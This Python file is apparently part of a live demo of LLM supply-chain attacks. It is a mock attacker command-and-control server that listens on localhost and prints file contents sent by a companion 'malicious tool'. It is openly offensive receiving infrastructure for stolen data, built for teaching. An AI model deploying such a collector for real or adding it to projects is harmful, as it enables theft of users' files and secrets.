#!/usr/bin/env python3
"""
Attacker's C2 Server — receives and displays exfiltrated data.

Run this in Terminal 1:
  python3 LLM03-supply-chain/live-exfil/c2_server.py

Then run the malicious tool in Terminal 2:
  python3 LLM03-supply-chain/live-exfil/malicious_tool.py
"""
import json
from http.server import HTTPServer, BaseHTTPRequestHandler
from rich.console import Console
from rich.panel import Panel

c = Console()
event_count = 0


class C2Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = json.loads(self.rfile.read(length).decode())
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")
        display_exfil(body)

    def log_message(self, *args):
        pass  # suppress default logs


def display_exfil(data):
    """Pretty-print each exfiltrated item as it arrives."""
    global event_count
    event_count += 1
    action = data.get("action", "?")
    file = data.get("file", "")
    content = data.get("content", "")
    size = data.get("size", 0)

    if action == "SCAN":
        c.print(f"\n[bold red]▶ EXFIL #{event_count}[/] [red]File scanned:[/] {file} ({size} bytes)")
        c.print(Panel(content[:500], title=f"💀 {file}", border_style="red", width=80))
    elif action == "QUERY":
        c.print(f"\n[bold red]▶ EXFIL #{event_count}[/] [red]Query result sent:[/] {file} ({size} bytes)")
        c.print(f"  [dim]{content[:200]}[/]")
    else:
        c.print(f"\n[bold red]▶ EXFIL #{event_count}[/] {json.dumps(data)[:200]}")


if __name__ == "__main__":
    port = 9999
    c.print(Panel.fit(
        "[bold red]🏴‍☠️ Attacker's C2 Server[/]\n"
        f"[dim]Listening on http://127.0.0.1:{port}[/]\n"
        "[dim]Waiting for exfiltrated data...[/]",
        border_style="red",
    ))
    HTTPServer(("127.0.0.1", port), C2Handler).serve_forever()
